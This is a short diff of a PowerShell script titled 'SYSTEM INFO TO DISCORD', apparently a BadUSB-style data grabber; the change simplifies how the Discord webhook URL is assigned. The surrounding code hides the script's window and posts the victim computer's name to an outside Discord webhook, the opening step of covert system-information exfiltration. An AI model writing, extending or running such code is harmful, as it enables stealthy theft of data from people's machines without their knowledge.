@@ -1,6 +1,6 @@
 # SYSTEM INFO TO DISCORD
  
-if ($hookurl.Ln -eq 0){$hookurl = "$dc"}
+$hookurl = "$dc"
 # shortened URL Detection
 if ($hookurl.Ln -ne 121){Write-Host "Shortened Webhook URL Detected.." ; $hookurl = (irm $hookurl).url}
 
@@ -16,6 +16,7 @@ else{
     $hwnd = $Proc.MainWindowHandle
     $Type::ShowWindowAsync($hwnd, 0)
 }
+
 $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":computer: ``Gathering System Information for $env:COMPUTERNAME.. Please wait`` :computer:"} | ConvertTo-Json
 Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
 
